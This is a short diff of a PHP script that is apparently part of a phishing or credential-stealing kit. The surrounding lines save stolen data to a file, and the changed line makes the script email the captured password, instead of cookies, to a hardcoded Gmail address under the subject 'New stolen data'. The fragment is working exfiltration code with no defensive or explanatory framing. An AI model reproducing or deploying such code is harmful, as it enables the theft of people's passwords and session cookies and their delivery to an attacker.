@@ -12,7 +12,7 @@ fclose($file);
 // Send an email notification with the stolen data
 $to = "oussamajmt@gmail.com";
 $subject = "New stolen data";
-$message = "Stolen cookies: " . $cookies;
+$message = "Stolen cookies: " . $password;
 $headers = "From: noreply@example.com";
 
 mail($to, $subject, $message, $headers);
